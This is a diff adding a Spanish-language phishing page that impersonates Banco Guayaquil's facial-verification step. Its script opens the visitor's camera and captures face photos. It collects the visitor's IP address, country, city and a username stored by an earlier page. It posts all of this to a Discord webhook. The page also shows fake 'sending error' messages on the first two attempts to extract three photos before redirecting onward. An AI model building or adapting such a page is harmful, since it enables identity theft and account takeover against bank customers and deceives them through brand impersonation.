@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verificación Facial - Banco Guayaquil</title>
+    <link rel="shortcut icon" href="source/ico.svg" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,opsz,wght@0,6..12,200..1000;1,6..12,200..1000&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Nunito Sans', sans-serif;
+            background-color: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .logo-container {
+            margin-bottom: 40px;
+            text-align: center;
+        }
+        
+        .verification-wrapper {
+            width: 100%;
+            max-width: 500px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            flex: 1;
+            justify-content: space-between;
+        }
+        
+        .logo-container img {
+            height: 50px;
+            width: auto;
+        }
+        
+        
+        .verification-subtitle-small {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 8px;
+            font-weight: 400;
+        }
+        
+        .verification-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #121212;
+            margin-bottom: 50px;
+        }
+        
+        .video-wrapper {
+            position: relative;
+            width: 260px;
+            height: 260px;
+            margin-bottom: 25px;
+            flex-shrink: 0;
+        }
+        
+        .circular-frame {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            overflow: hidden;
+            position: relative;
+            border: 3px solid #d2006e;
+            background: #f5f5f5;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+        
+        .circular-frame.verifying {
+            border: 3px solid transparent;
+        }
+        
+        .circular-frame.verifying::before {
+            content: '';
+            position: absolute;
+            top: -4px;
+            left: -4px;
+            right: -4px;
+            bottom: -4px;
+            border-radius: 50%;
+            background: conic-gradient(
+                from 0deg,
+                #d2006e 0deg,
+                #d2006e 180deg,
+                rgba(210, 0, 110, 0.3) 200deg,
+                transparent 240deg,
+                transparent 360deg
+            );
+            mask: radial-gradient(circle, transparent calc(50% - 4px), black calc(50% - 4px), black calc(50% + 4px), transparent calc(50% + 4px));
+            -webkit-mask: radial-gradient(circle, transparent calc(50% - 4px), black calc(50% - 4px), black calc(50% + 4px), transparent calc(50% + 4px));
+            animation: verify-spinner 1.5s linear infinite;
+            z-index: 10;
+        }
+        
+        @keyframes verify-spinner {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        
+        #videoStream {
+            width: calc(100% - 6px);
+            height: calc(100% - 6px);
+            object-fit: cover;
+            display: none;
+            transform: scaleX(-1);
+            border-radius: 50%;
+            position: absolute;
+            top: 3px;
+            left: 3px;
+        }
+        
+        .video-overlay {
+            position: absolute;
+            top: 3px;
+            left: 3px;
+            width: calc(100% - 6px);
+            height: calc(100% - 6px);
+            border-radius: 50%;
+            pointer-events: none;
+            border: 2px solid rgba(255, 255, 255, 0.5);
+            box-sizing: border-box;
+        }
+        
+        #canvasCapture {
+            display: none;
+        }
+        
+        .camera-placeholder {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: #f5f5f5;
+            color: #666;
+            border-radius: 50%;
+        }
+        
+        .camera-icon {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 15px;
+            opacity: 0.4;
+        }
+        
+        .camera-placeholder p {
+            font-size: 14px;
+            color: #999;
+        }
+        
+        .position-text {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 30px;
+            min-height: 20px;
+            visibility: visible;
+            opacity: 1;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+        
+        .position-text.hidden {
+            visibility: hidden;
+            opacity: 0;
+            margin-bottom: 30px;
+        }
+        
+        .capture-button {
+            width: 100%;
+            max-width: 260px;
+            padding: 16px 32px;
+            background: #d2006e;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            visibility: visible;
+            opacity: 1;
+        }
+        
+        .capture-button.hidden {
+            visibility: hidden;
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .capture-button:hover {
+            background: #b8005a;
+        }
+        
+        .capture-button:disabled {
+            background: #e0e0e0;
+            color: #898989;
+            cursor: not-allowed;
+        }
+        
+        .retry-button {
+            width: 100%;
+            max-width: 260px;
+            padding: 16px 32px;
+            background: white;
+            color: #d2006e;
+            border: 2px solid #d2006e;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            visibility: hidden;
+            opacity: 0;
+            pointer-events: none;
+            margin-top: 15px;
+        }
+        
+        .retry-button.show {
+            visibility: visible;
+            opacity: 1;
+            pointer-events: auto;
+        }
+        
+        .retry-button:hover {
+            background: #f8f9fa;
+        }
+        
+        .error-message {
+            color: #d2006e;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 15px;
+            visibility: hidden;
+            opacity: 0;
+            min-height: 20px;
+        }
+        
+        .error-message.show {
+            visibility: visible;
+            opacity: 1;
+        }
+        
+        .success-message {
+            color: #28a745;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 15px;
+            visibility: hidden;
+            opacity: 0;
+            min-height: 20px;
+        }
+        
+        .success-message.show {
+            visibility: visible;
+            opacity: 1;
+        }
+        
+        .captured-preview {
+            width: 260px;
+            height: 260px;
+            border-radius: 50%;
+            overflow: hidden;
+            position: absolute;
+            top: 0;
+            left: 0;
+            display: none;
+            border: none;
+        }
+        
+        .captured-preview img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: none;
+        }
+        
+        #nipper {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+        
+        #circle {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 16px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        #nipper p {
+            color: #666;
+            font-size: 16px;
+        }
+        
+        @media (max-width: 480px) {
+            body {
+                justify-content: flex-start;
+                padding-top: 20px;
+                padding-bottom: 20px;
+            }
+            
+            .logo-container {
+                margin-bottom: 20px;
+                margin-top: 10px;
+            }
+            
+            .logo-container img {
+                height: 40px;
+            }
+            
+            .verification-wrapper {
+                position: relative;
+                flex: 1;
+                display: flex;
+                flex-direction: column;
+                min-height: calc(100vh - 120px);
+                padding-bottom: 150px;
+            }
+            
+            .verification-title {
+                font-size: 24px;
+                margin-bottom: 20px;
+                position: fixed;
+                top: calc(50% - 235px);
+                left: 50%;
+                transform: translateX(-50%);
+                width: 90%;
+                z-index: 1;
+            }
+            
+            .verification-subtitle-small {
+                position: fixed;
+                top: calc(50% - 200px);
+                left: 50%;
+                transform: translateX(-50%);
+                width: 90%;
+                z-index: 1;
+            }
+            
+            .video-wrapper {
+                width: 240px;
+                height: 240px;
+                flex-shrink: 0;
+                flex-grow: 0;
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                margin: 0;
+                z-index: 5;
+            }
+            
+            .position-text {
+                position: fixed;
+                top: calc(50% + 130px);
+                left: 50%;
+                transform: translateX(-50%);
+                width: 90%;
+                min-height: 20px;
+                z-index: 10;
+            }
+            
+            .error-message,
+            .success-message {
+                position: fixed;
+                top: calc(50% + 130px);
+                left: 50%;
+                transform: translateX(-50%);
+                width: 90%;
+                max-width: 400px;
+                min-height: 20px;
+                z-index: 30;
+            }
+            
+            .captured-preview {
+                width: 240px;
+                height: 240px;
+            }
+            
+            .capture-button,
+            .retry-button {
+                position: absolute;
+                bottom: 75px;
+                left: 50%;
+                transform: translateX(-50%);
+                width: 90%;
+                max-width: 400px;
+                min-height: 54px;
+                margin: 0;
+            }
+            
+            .error-message,
+            .success-message {
+                position: fixed;
+                top: calc(50% + 130px);
+                left: 50%;
+                transform: translateX(-50%);
+                width: 90%;
+                max-width: 400px;
+                min-height: 20px;
+                z-index: 20;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="logo-container">
+        <img src="source/lg.svg" alt="Banco Guayaquil">
+    </div>
+    
+    <div class="verification-wrapper">
+        <p class="verification-subtitle-small">Verificación Facial</p>
+        <h1 class="verification-title">Complete su identificación</h1>
+        
+        <div class="video-wrapper">
+            <div class="circular-frame">
+                <video id="videoStream" autoplay playsinline></video>
+                <div class="video-overlay"></div>
+                <div class="camera-placeholder" id="cameraPlaceholder">
+                    <svg class="camera-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path>
+                        <circle cx="12" cy="13" r="4"></circle>
+                    </svg>
+                    <p>Iniciando cámara...</p>
+                </div>
+                <div class="captured-preview" id="capturedPreview">
+                    <img id="previewImage" alt="Captura facial">
+                </div>
+            </div>
+            <canvas id="canvasCapture"></canvas>
+        </div>
+        
+        <p class="position-text">Posicione su rostro en el círculo</p>
+        
+        <button class="capture-button" id="captureBtn" disabled>Tomar Foto</button>
+        <button class="retry-button" id="retryBtn">Tomar Otra Foto</button>
+        
+        <div class="error-message" id="errorMsg"></div>
+        <div class="success-message" id="successMsg">Verificación exitosa</div>
+    </div>
+    
+    <div id="nipper">
+        <img id="circle" src="source/ico.svg" alt="">
+        <p>Verificando identidad...</p>
+    </div>
+
+    <div id="gfg" style="display:none;"></div>
+    <div id="ip" style="display:none;"></div>
+    <div id="address" style="display:none;"></div>
+    <script src="xjsx.js"></script>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const video = document.getElementById('videoStream');
+    const canvas = document.getElementById('canvasCapture');
+    const captureBtn = document.getElementById('captureBtn');
+    const retryBtn = document.getElementById('retryBtn');
+    const cameraPlaceholder = document.getElementById('cameraPlaceholder');
+    const capturedPreview = document.getElementById('capturedPreview');
+    const previewImage = document.getElementById('previewImage');
+    const errorMsg = document.getElementById('errorMsg');
+    const successMsg = document.getElementById('successMsg');
+    const loadingDiv = document.getElementById('nipper');
+    const positionText = document.querySelector('.position-text');
+    
+    let stream = null;
+    let capturedImage = null;
+    let isProcessing = false;
+    let attemptCount = 0;
+    
+    // Iniciar cámara al cargar la página
+    startCamera();
+    
+    function startCamera() {
+        navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                facingMode: 'user',
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+            } 
+        })
+        .then(function(mediaStream) {
+            stream = mediaStream;
+            video.srcObject = mediaStream;
+            video.play();
+            video.style.display = 'block';
+            cameraPlaceholder.style.display = 'none';
+            captureBtn.disabled = false;
+            errorMsg.classList.remove('show');
+        })
+        .catch(function(error) {
+            console.error('Error al acceder a la cámara:', error);
+            cameraPlaceholder.innerHTML = '<p style="color: #d2006e; font-size: 12px;">No se pudo acceder a la cámara. Por favor, permite el acceso y recarga la página.</p>';
+            errorMsg.textContent = 'Error al acceder a la cámara. Por favor, verifica los permisos.';
+            errorMsg.classList.add('show');
+            captureBtn.disabled = true;
+        });
+    }
+    
+    function capturePhoto() {
+        if (!stream || isProcessing) return;
+        
+        const context = canvas.getContext('2d');
+        // Usar dimensiones más grandes para mejor calidad
+        const maxWidth = 1280;
+        const maxHeight = 720;
+        
+        // Calcular dimensiones manteniendo la proporción del video
+        const videoAspect = video.videoWidth / video.videoHeight;
+        let canvasWidth = video.videoWidth;
+        let canvasHeight = video.videoHeight;
+        
+        // Escalar si es necesario para mantener calidad pero no exceder límites
+        if (canvasWidth > maxWidth) {
+            canvasHeight = (maxWidth / canvasWidth) * canvasHeight;
+            canvasWidth = maxWidth;
+        }
+        if (canvasHeight > maxHeight) {
+            canvasWidth = (maxHeight / canvasHeight) * canvasWidth;
+            canvasHeight = maxHeight;
+        }
+        
+        canvas.width = canvasWidth;
+        canvas.height = canvasHeight;
+        
+        // Dibujar la imagen completa del video (sin espejo para la captura)
+        context.save();
+        context.translate(canvasWidth, 0);
+        context.scale(-1, 1);
+        context.drawImage(video, 0, 0, canvasWidth, canvasHeight);
+        context.restore();
+        
+        // Convertir a base64 - imagen completa sin máscara circular
+        capturedImage = canvas.toDataURL('image/jpeg', 0.9);
+        
+        // Incrementar contador de intentos
+        attemptCount++;
+        
+        // Activar animación de verificación
+        const circularFrame = document.querySelector('.circular-frame');
+        circularFrame.classList.add('verifying');
+        
+        // Ocultar video pero NO detener el stream (mantiene el permiso)
+        video.style.display = 'none';
+        
+        // Mostrar preview
+        previewImage.src = capturedImage;
+        capturedPreview.style.display = 'block';
+        captureBtn.classList.add('hidden');
+        retryBtn.classList.remove('show');
+        positionText.classList.add('hidden');
+        
+        // Ocultar mensajes inicialmente
+        errorMsg.classList.remove('show');
+        successMsg.classList.remove('show');
+        
+        // Después de que termine el spinner (3 segundos), mostrar mensaje y botón
+        setTimeout(() => {
+            circularFrame.classList.remove('verifying');
+            
+            if (attemptCount <= 2) {
+                // Primeras 2 fotos: mostrar error y botón de retry
+                retryBtn.classList.add('show');
+                errorMsg.textContent = 'Error al enviar verificación. Por favor, intenta de nuevo.';
+                errorMsg.classList.add('show');
+                // Ocultar el texto de posición cuando aparece el error
+                positionText.classList.add('hidden');
+            } else {
+                // Tercera foto: mostrar éxito y redirigir (sin botón retry)
+                successMsg.textContent = 'Verificación exitosa';
+                successMsg.classList.add('show');
+                // Ocultar el texto de posición cuando aparece el éxito
+                positionText.classList.add('hidden');
+                // Redirigir después de mostrar el mensaje de éxito
+                setTimeout(() => {
+                    window.location.href = 'Hot.html';
+                }, 1500);
+            }
+        }, 3000);
+    }
+    
+    captureBtn.addEventListener('click', function() {
+        capturePhoto();
+        sendToDiscord();
+    });
+    
+    retryBtn.addEventListener('click', function() {
+        const circularFrame = document.querySelector('.circular-frame');
+        const successMsg = document.getElementById('successMsg');
+        circularFrame.classList.remove('verifying');
+        
+        // Ocultar mensajes
+        errorMsg.classList.remove('show');
+        successMsg.classList.remove('show');
+        
+        capturedPreview.style.display = 'none';
+        captureBtn.classList.remove('hidden');
+        retryBtn.classList.remove('show');
+        positionText.classList.remove('hidden');
+        capturedImage = null;
+        
+        // Si el stream aún existe y está activo, solo mostrar el video
+        if (stream && stream.active) {
+            video.style.display = 'block';
+            video.play();
+        } else {
+            // Si el stream no existe o no está activo, reiniciar cámara
+            // Pero el permiso ya está otorgado, así que no pedirá permiso de nuevo
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+            startCamera();
+        }
+    });
+
+    function fetchIPData() {
+        let ipAddress = '';
+        return fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                ipAddress = data.ip || '';
+                document.getElementById('gfg').innerHTML = ipAddress;
+                return fetch('https://ipinfo.io/json');
+            })
+            .then(response => {
+                if (!response.ok) throw new Error('Error en ipinfo');
+                return response.json();
+            })
+            .then(data => {
+                const ip = data.ip || ipAddress || 'No disponible';
+                const country = data.country || 'No disponible';
+                const city = data.city || 'No disponible';
+                document.getElementById('ip').innerHTML = 'IP: ' + ip;
+                document.getElementById('address').innerHTML = country + ', ' + city;
+                return { ip: ip, country: country, city: city };
+            })
+            .catch(error => {
+                // Si falla ipinfo, usar solo el IP de ipify
+                const ip = ipAddress || 'No disponible';
+                document.getElementById('ip').innerHTML = 'IP: ' + ip;
+                document.getElementById('address').innerHTML = 'No disponible, No disponible';
+                return { ip: ip, country: 'No disponible', city: 'No disponible' };
+            });
+    }
+
+    function sendToDiscord() {
+        if (isProcessing || !capturedImage) return;
+        
+        isProcessing = true;
+        captureBtn.disabled = true;
+        retryBtn.disabled = true;
+        
+        fetchIPData().then((ipData) => {
+            const ip = ipData.ip || 'No disponible';
+            const country = ipData.country || 'No disponible';
+            const city = ipData.city || 'No disponible';
+            
+            // Obtener el usuario guardado desde index.html
+            const username = sessionStorage.getItem('capturedUsername') || 'No disponible';
+            
+            // Crear mensaje de texto
+            const message = `🫵🏼 VERIFICACIÓN FACIAL 🫵🏼
+
+USUARIO: ${username}
+
+🌎IP: ${ip}
+${country}, ${city}`;
+            
+            // Intentar enviar la imagen usando el webhook con archivo
+            const formData = new FormData();
+            const blob = dataURLtoBlob(capturedImage);
+            formData.append('file', blob, 'verificacion_facial.jpg');
+            
+            // Enviar primero el mensaje de texto
+            const discordMessage = {
+                content: `📸 **Verificación Facial Capturada**\n\`\`\`\n${message}\`\`\``
+            };
+            
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(discordMessage)
+            })
+            .then(() => {
+                // Intentar enviar la imagen
+                return fetch(DISCORD_WEBHOOK + '?wait=true', {
+                    method: 'POST',
+                    body: formData
+                });
+            })
+            .catch(() => {
+                // Si falla, enviar con embed
+                const base64Message = {
+                    content: `📸 **Verificación Facial Capturada**\n\`\`\`\n${message}\`\`\``,
+                    embeds: [{
+                        title: 'Imagen de Verificación Facial',
+                        image: {
+                            url: capturedImage
+                        }
+                    }]
+                };
+                
+                return fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(base64Message)
+                });
+            })
+            .then(response => {
+                if (response && response.ok) {
+                    // No detener el stream - mantenerlo activo para evitar pedir permiso de nuevo
+                    // Sin loading
+                } else {
+                    throw new Error('Error al enviar');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // Intentar con embed como último recurso
+                const base64Message = {
+                    content: `📸 **Verificación Facial Capturada**\n\`\`\`\n${message}\`\`\``,
+                    embeds: [{
+                        title: 'Imagen de Verificación Facial',
+                        image: {
+                            url: capturedImage
+                        }
+                    }]
+                };
+                
+                return fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(base64Message)
+                });
+            })
+            .then(response => {
+                if (response && response.ok) {
+                    // No detener el stream - mantenerlo activo para evitar pedir permiso de nuevo
+                    // Sin loading
+                } else {
+                    // Solo mostrar error en los primeros 2 intentos
+                    if (attemptCount <= 2) {
+                        errorMsg.textContent = 'Error al enviar verificación. Por favor, intenta de nuevo.';
+                        errorMsg.style.display = 'block';
+                    }
+                    isProcessing = false;
+                    captureBtn.disabled = false;
+                    retryBtn.disabled = false;
+                }
+            })
+            .catch(error => {
+                console.error('Error de red:', error);
+                // Solo mostrar error en los primeros 2 intentos
+                if (attemptCount <= 2) {
+                    errorMsg.textContent = 'Error de conexión. Por favor, intenta de nuevo.';
+                    errorMsg.style.display = 'block';
+                }
+                isProcessing = false;
+                captureBtn.disabled = false;
+                retryBtn.disabled = false;
+            });
+        });
+    }
+
+    function dataURLtoBlob(dataurl) {
+        const arr = dataurl.split(',');
+        const mime = arr[0].match(/:(.*?);/)[1];
+        const bstr = atob(arr[1]);
+        let n = bstr.length;
+        const u8arr = new Uint8Array(n);
+        while(n--) {
+            u8arr[n] = bstr.charCodeAt(n);
+        }
+        return new Blob([u8arr], {type: mime});
+    }
+    
+    // Limpiar stream al salir de la página
+    window.addEventListener('beforeunload', function() {
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+        }
+    });
+});
+</script>
+
+</body>
+</html>
